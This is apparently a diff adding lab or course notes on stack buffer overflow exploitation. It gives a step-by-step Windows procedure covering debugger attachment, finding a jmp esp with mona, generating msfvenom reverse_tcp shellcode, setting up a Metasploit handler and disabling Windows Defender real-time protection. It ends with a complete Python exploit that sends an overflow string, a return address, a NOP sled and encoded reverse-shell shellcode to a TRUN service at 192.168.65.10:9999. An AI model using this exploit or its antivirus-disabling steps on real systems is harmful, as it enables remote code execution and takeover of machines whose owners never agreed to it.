@@ -537,6 +537,7 @@ Utilizing tools such as:
   GDB, MONA, IMMUNITY
   BASH, PYTHON
 ```
+# Linux 
 # passing args to a executable (bash)
 ./func $(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") (see if it can be passed into it as a argument)
 ./func <<<$(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") (passes into it when it runs)
@@ -568,3 +569,89 @@ shell (gives us a shell)
 9) then run the file against the script
 10) 
  env - gdb ./func
+
+# Windows
+
+1) strings the program to look through it to see if it is for windows (will have dll) or linux
+2) get-content [file] | select -first 1   (look for MZ for windows)
+3) if opens listening prot start new powershell and run netstat -anob
+4) find the service and find its port
+5) go to linux and run nc [ip] [port]
+6) see what the port does and get as much onfo as possible
+7) Open ghidra and try to find TRUN or the command we run
+8) close ghidra and open immunity debugger as admin
+9) File -> attach -> process id of whats running (it will pause the program when it attaches, press play to let ir run again, << rewind button for when we break it)
+10) click play to run program
+11) go to lin ops to build exploit and verify size of buffer and send data to server
+12) go to wiremask and get set the size to what the buffer is
+13) run script on lin-ops and then look at results in the immunity debugger screeen in the top right eip section will have a value
+14) delete buf += line, add back buf += "A" * number from wiremask, add another buf += "BBBB"
+15) rewind program on windows then press play
+16) run script again to make sure it actually overrides the script by checking EIP has 42424242
+17) find jump esp locations by seraching !mona modules. it will bring up a window with dlls and more
+18) find the vulnerable dll that we can exploit, run !mona jmp -r esp -m"[dll that is exploitable]"
+19) click window -> log data then it will show the jmp esp locations
+20) grab first 4 of results and right click copy to clipboard then paste it in. change upper case letters to lower case
+21) sepperate then reverse the order (0x625012a0 -> 62 50 12 A0 "\xa0\x12\x50\x62")
+22) grab first jmp esp location and a dd it in where the 4 BBBB are, also add buf += "\x90" * 15
+23) generate a payload with msfvenom -p windows/shell/reverse_tcp lhost=192.168.65.20 lport=10006 -b "\x00" -f python    (everything outside the network can talk to the 10.50.XX.XX) then copy results into the script
+24) set up a msconsole, use multi/handler, show options, set payload windows/meterpreter/reverse_tcp, set LHOST 0.0.0.0, set LPORT 10006, ctrl+c the last running of script, go to windows op staiton, rewind and play so the it is running, turun off realtime protection from windows defender
+25) up arrow, click on sheild icon, click virus and protections settings, turn off real time protection
+26) back on temrinator, in msfconsole run exploit
+27) run script and pray the shell code worked (make sure to play the script.)
+
+
+
+#!/usr/bin/env python
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 15
+'''
+0x625012a0 -> 62 50 12 A0 "\xa0\x12\x50\x62"
+0x625012ad -> 62 50 12 AD "\xad\x12\x50\x62"
+0x625012ba -> 62 50 12 BA "\xba\x12\x50\x62"
+0x625012c7 -> 62 50 12 C7 "\xc7\x12\x50\x62"
+
+'''
+buf += b"\xdb\xc6\xb8\xc1\xf1\xc6\x5a\xd9\x74\x24\xf4\x5b"
+buf += b"\x2b\xc9\xb1\x59\x31\x43\x19\x83\xc3\x04\x03\x43"
+buf += b"\x15\x23\x04\x3a\xb2\x2c\xe7\xc3\x43\x52\xd9\x11"
+buf += b"\xca\x77\x7d\x1d\x9f\x47\xf5\x73\x2c\x2c\x5b\x60"
+buf += b"\x23\x85\x16\xae\x0a\x16\x2d\xdc\x44\xd9\xf2\x8d"
+buf += b"\xa9\x78\x8f\xcf\xfd\x5a\xae\x1f\xf0\x9b\xf7\xe9"
+buf += b"\x7e\x74\xa5\x62\xd2\x9a\xc1\x37\xef\x9b\x05\xe0"
+buf += b"\x84\xdb\xdd\x8a\x5b\xaf\x51\x94\x8b\xc4\x32\xb6"
+buf += b"\x2a\x09\x92\x3d\x64\xb5\x96\x8b\x01\xf9\xd1\x3a"
+buf += b"\x15\x8a\xd6\xb7\xe8\x5a\x27\x08\x2b\xad\x45\x24"
+buf += b"\xad\xf6\x6e\xd4\xdb\x0c\x8d\x69\xdc\xd7\xef\xb5"
+buf += b"\x69\xc7\x48\x3d\xc9\x23\x68\x92\x8c\xa0\x66\x5f"
+buf += b"\xda\xee\x6a\x5e\x0f\x85\x97\xeb\xae\x49\x1e\xaf"
+buf += b"\x94\x4d\x7a\x6b\xb4\xd4\x26\xda\xc9\x06\x8e\x83"
+buf += b"\x6f\x4d\x3d\xd5\x10\xae\xbd\xda\x4c\x38\x71\x17"
+buf += b"\x6f\xb8\x1d\x20\x1c\x8a\x82\x9a\x8a\xa6\x4b\x05"
+buf += b"\x4c\xbf\x5c\xb6\x82\x07\x0c\x48\x23\x77\x04\x8f"
+buf += b"\x77\x27\x3e\x26\xf8\xac\xbe\xc7\x2d\x58\xb5\x5f"
+buf += b"\x0e\x34\x88\x8b\xe6\x46\x0b\x93\xe0\xcf\xed\x8b"
+buf += b"\x5c\x9f\xa1\x6b\x0d\x5f\x12\x04\x47\x50\x4d\x34"
+buf += b"\x68\xbb\xe6\xdf\x87\x15\x5e\x48\x31\x3c\x14\xe9"
+buf += b"\xbe\xeb\x50\x29\x34\x19\xa4\xe4\xbd\x68\xb6\x11"
+buf += b"\xda\x92\x46\xe2\x4f\x92\x2c\xe6\xd9\xc5\xd8\xe4"
+buf += b"\x3c\x21\x47\x16\x6b\x32\x80\xe8\xea\x02\xfa\xdf"
+buf += b"\x78\x2a\x94\x1f\x6d\xaa\x64\x76\xe7\xaa\x0c\x2e"
+buf += b"\x53\xf9\x29\x31\x4e\x6e\xe2\xa4\x71\xc6\x56\x6e"
+buf += b"\x1a\xe4\x81\x58\x85\x17\xe4\xda\xc2\xe7\x7a\xf5"
+buf += b"\x6a\x8f\x84\x45\x8b\x4f\xef\x45\xdb\x27\xe4\x6a"
+buf += b"\xd4\x87\x05\xa1\xbd\x8f\x8c\x24\x0f\x2e\x90\x6c"
+buf += b"\xd1\xee\x91\x83\xca\x01\xeb\xec\xed\xe2\x0c\xe5"
+ buf += b"\x89\xe3\x0c\x09\xac\xd8\xda\x30\xda\x1f\xdf\x06"
+ buf += b"\xd5\x2a\x42\x2e\x7c\x54\xd0\x30\x55"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.65.10",9999))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
